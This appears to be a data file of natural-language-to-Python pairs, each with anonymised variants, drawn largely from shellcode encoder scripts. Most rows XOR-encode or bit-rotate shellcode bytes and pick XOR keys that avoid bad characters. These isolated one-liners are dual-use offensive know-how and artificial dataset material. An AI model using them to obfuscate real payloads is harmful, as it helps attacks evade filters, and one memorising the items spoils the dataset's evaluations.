+call the exit function from sys with 0 as argument,call exit function from var0 with 0 as argument,sys . exit ( 0 ),var0 . exit ( 0 )
+Set total to the number of command-line arguments,Set total to number of command-line arguments,total = len ( sys . argv ),total = len ( sys . argv )
+try,try,try:,try:
+subtract 1 from 2 raised to max_bits and assign the result to val1,subtract 1 from 2 raised to var0 and assign result to var1,val1 = 2 ** max_bits - 1,var1 = 2 ** var0 - 1
+val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i,var0 is result of var1 xor between integer base 16 of string byte encoded to hex and i,"val1 = int ( byte . encode ( 'hex' ) , 16 ) ^ i","var0 = int ( byte . encode ( 'hex' ) , 16 ) ^ i"
+val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte,var0 is result of var1 xor between integer base 16 of element i of chunk encoded to hex and var2,"val2 = int ( chunk [ i ] . encode ( 'hex' ) , 16 ) ^ xor_byte","var0 = int ( chunk [ i ] . encode ( 'hex' ) , 16 ) ^ var2"
+val2 is rbits modulo max_bits,var0 is var1 var2 var3,val2 = r_bits % max_bits,var0 = r_bits % var3
+W is a string '\033[0m',W is a string '\033[0m',W = '\033[0m',W = '\033[0m'
+while the length of shellcode is greater than integer 0,while length of var0 is greater var1 integer 0,while len ( shellcode ) > 0 : ,while len ( var0 ) > 0 : 
+while x is less than shellcode_len,while x is less var0 var1,while x < shellcode_len : ,while x < var1 : 
+start a while loop with the condition xor_byte_good if equivalent to False,start while loop with condition var0 if equivalent to var1,while ( xor_byte_good == False ) : ,while ( var0 == var1 ) : 
+open the file stored in shellcode_file using an alias variable f,open file stored in var0 using alias variable f,with open ( shellcode_file ) as f : ,with open ( var0 ) as f : 
+increment x by 1,increment x by 1,x += 1,x += 1
+increment x by 2,increment x by 2,x += 2,x += 2
+x is not x,x is not x,x = ~ x,x = ~ x
+x is 0,x is 0,x = 0,x = 0
+assign the variable x the value of the function rol with x and rand as parameters,assign variable x value of function var0 with x and rand as parameters,"x = rol ( x , rand )","x = var0 ( x , rand )"
+left shift x by 1,left shift x by 1,x = x << 1,x = x << 1
+x is x xor 0xDD,x is x xor 0xDD,x = x ^ 0xDD,x = x ^ 221
+assign the variable x the value of the bitwise xor operation of x and rand,assign variable x value of var0 xor operation of x and rand,x = x ^ rand,x = x ^ rand
+set x to y minus 0x10,set x to y minus var0,x = y - 0x10,x = y - var0
+set x to y minus 0x2,set x to y minus var0,x = y - 0x2,x = y - var0
+xor is the second element of sys.argv converted to integer,xor is second element of var0 converted to integer,xor = int ( sys . argv [ 2 ] ),xor = int ( var0 [ 2 ] )
+XOR is the third element of sys.argv converted to integer,var0 is third element of var1 converted to integer,XOR = int ( sys . argv [ 3 ] ),var0 = int ( var1 [ 3 ] )
+assign 0 to xor_byte,assign 0 to var0,xor_byte = 0,var0 = 0
+xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars,xor_byte is output of function var0 with input parameters chunk and var1,"xor_byte = find_valid_xor_byte ( chunk , bad_chars )","xor_byte = var0 ( chunk , var1 )"
+xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars,xor_byte is output of function var0 with input parameters var1 and var2,"xor_byte = find_valid_xor_byte ( string1 , bad_chars )","xor_byte = var0 ( var1 , var2 )"
+set the variable xor_byte_good to the value False,set variable var0 to value var1,xor_byte_good = False,var0 = var1
+set the variable xor_byte_good to the value True,set variable var0 to value var1,xor_byte_good = True,var0 = var1
+XOR_HEX is XOR converted to hexadecimal,XOR_HEX is var0 converted to hexadecimal,XOR_HEX = hex ( XOR ),XOR_HEX = hex ( var0 )
+"Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx","Take absolute value of var0 then convert var0 to integer, then cast to hexadecimal, slice variable var2 between var4 0 and 2 then cast var2 to type var5 store value of summation in variable xxx","xxx = hex ( int ( abs ( subfs ) ) + int ( rev_suplx [ 0 : 2 ] , 16 ) )","xxx = hex ( int ( abs ( var0 ) ) + int ( var2 [ 0 : 2 ] , 16 ) )"
+compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y,compute var0 xor of y and first element of var1 converted into byte array and store result in variable y,y ^= bytearray ( shellcode ) [ 1 ],y ^= bytearray ( var1 ) [ 1 ]
+Y is a '\033[33m',Y is a '\033[33m',Y = '\033[33m',Y = '\033[33m'
+y is not x,y is not x,y = ~ x,y = ~ x
+compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array,compute var0 xor of first element in var1 converted into var3 and second element of var1 converted into byte array,y = bytearray ( shellcode ) [ 0 ] ^ bytearray ( shellcode ) [ 1 ],y = var3 ( var1 ) [ 0 ] ^ var3 ( var1 ) [ 1 ]
+set the variable y to x bitwise xor of 0x88,set variable y to x var0 xor of var1,y = x ^ 0x88,y = x ^ var1
+set y to x bitwise xor of 0x97,set y to x var0 xor of var1,y = x ^ 0x97,y = x ^ var1
+y is x xor 0xAA,y is x xor 0xAA,y = x ^ 0xAA,y = x ^ 170
+set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray,set variable y equal to x var0 xor element n of var1 converted into var2,y = x ^ bytearray ( shellcode ) [ n ],y = x ^ var2 ( var1 ) [ n ]
+set the variable z to bitwise not x,set variable z to var0 not x,z = ~ x,z = ~ x
